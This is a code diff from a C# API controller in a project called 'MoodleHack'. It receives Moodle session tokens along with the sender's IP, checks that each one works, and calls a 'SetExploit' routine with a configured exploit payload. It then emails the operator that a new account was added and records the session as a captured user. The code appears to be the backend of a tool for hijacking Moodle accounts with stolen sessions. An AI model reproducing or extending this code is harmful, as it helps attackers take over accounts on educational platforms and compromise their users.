@@ -38,23 +38,20 @@ namespace MoodleHack.API.Controllers
            
             if (countUnsuccessQueries > 15)
                 return Ok();
+            var result = await _sdoApiClient.Validate(moodleSession);
+            if (result)
+            {
+                result = await _sdoApiClient.SetExploit(moodleSession, _configuration["EXPLOIT"]);
+                if (!result)
+                    _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, false, DateTime.Now));
+                await _emailClient.SendMessage(_configuration["TOEMAIL"], "MoodleService",
+                    "Успешно был добавлен новый аккаунт!");
+                _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, true, DateTime.Now));
+                _appDbContext.Users.Add(new UserAccountEntity(null, moodleSession, null, DateTime.Now, true));
+            }
             else
             {
-                var result = await _sdoApiClient.Validate(moodleSession);
-                if (result)
-                {
-                    result = await _sdoApiClient.SetExploit(moodleSession, _configuration["EXPLOIT"]);
-                    if (!result)
-                        _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, false, DateTime.Now));
-                    await _emailClient.SendMessage(_configuration["TOEMAIL"], "MoodleService",
-                        "Успешно был добавлен новый аккаунт!");
-                    _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, true, DateTime.Now));
-                    _appDbContext.Users.Add(new UserAccountEntity(null, moodleSession, null, DateTime.Now, true));
-                }
-                else
-                {
-                    _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, false, DateTime.Now));
-                }
+                _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, false, DateTime.Now));
             }
 
             await _appDbContext.SaveChangesAsync();
